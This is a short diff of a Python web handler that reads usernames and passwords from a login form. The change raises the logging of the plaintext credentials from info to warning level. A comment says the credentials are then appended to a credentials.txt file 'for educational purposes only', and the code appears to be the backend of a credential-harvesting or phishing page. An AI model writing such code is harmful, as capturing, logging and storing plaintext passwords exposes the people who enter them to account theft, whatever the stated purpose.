@@ -15,8 +15,8 @@ def submit():
     username = request.form.get('username')
     password = request.form.get('password')
     logging.warning("Someone logged in!!!!!!!!!!!!!!!!")
-    logging.info(username)
-    logging.info(password)
+    logging.warning(username)
+    logging.warning(password)
 
     # Save credentials to a text file (for educational purposes only)
     with open("credentials.txt", "a") as file:
